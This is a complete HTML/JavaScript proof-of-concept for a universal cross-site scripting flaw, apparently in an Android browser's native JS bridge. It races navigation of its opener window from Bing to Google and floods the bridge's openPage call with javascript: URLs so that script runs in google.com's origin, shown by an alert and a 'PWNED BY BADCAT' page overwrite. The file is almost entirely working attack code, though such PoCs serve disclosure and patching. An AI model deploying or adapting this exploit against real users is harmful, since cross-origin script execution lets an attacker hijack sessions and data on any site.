<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>UXSS PoC</title>
<style>
  body { margin: 2rem; font: 16px system-ui; }
  button { width: 100%; padding: 1rem; font: inherit; }
</style>
<button>Run PoC</button>
<p>Ready</p>
<script>
const child = new URLSearchParams(location.search).has('child');
const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
const status = text => document.querySelector('p').textContent = text;

if (!child) {
  document.querySelector('button').onclick = () => {
    const popup = open(`${location.pathname}?child&t=${Date.now()}`, `uxss_${Date.now()}`);
    status(popup ? 'Running…' : 'Popup blocked');
  };
} else {
  document.querySelector('button').remove();
  status('Waiting for bridge…');
  run();
}

async function run() {
  let target, call, proxy;

  while (!call) {
    try {
      target = opener;
      proxy = target.bridgeProxy;
      if (!proxy) throw 0;
      call = target.appJsBridge.callApi.bind(target.appJsBridge);
    } catch (_) {
      await wait(10);
    }
  }

  status('Opening Bing…');
  target.location.replace('https://www.bing.com/');
  await new Promise(resolve => {
    const timer = setInterval(() => {
      try {
        void target.document;
      } catch (_) {
        clearInterval(timer);
        resolve();
      }
    }, 1);
  });

  await wait(1800);
  status('Checking bridge…');
  const permission = JSON.parse(
    proxy.newCall('BrowserPriv.getAndroidVersion', '{}', '')
  );
  if (permission.code !== 0) return status('Blocked');

  status('Bridge ready');
  call('BridgeCommonApi.openPage', {
    url: "javascript:if(location.hostname==='www.bing.com')document.title='READY'"
  });

  await wait(2000);
  status('Triggering…');
  target.location.replace('https://www.google.com/');

  const payload = `javascript:if(location.hostname==='www.google.com'&&!window.__uxss){window.__uxss=1;alert(document.domain);document.write("<body bgcolor='white'><h1>PWNED BY BADCAT</h1></body>")}`;
  for (const delay of [0, 8, 16, 32, 64, 128, 256, 512]) {
    setTimeout(() => {
      for (let i = 0; i < 48; i++) {
        try { call('BridgeCommonApi.openPage', {url: payload}); } catch (_) {}
      }
    }, delay);
  }
  setTimeout(() => status('Payload sent'), 600);
}
</script>
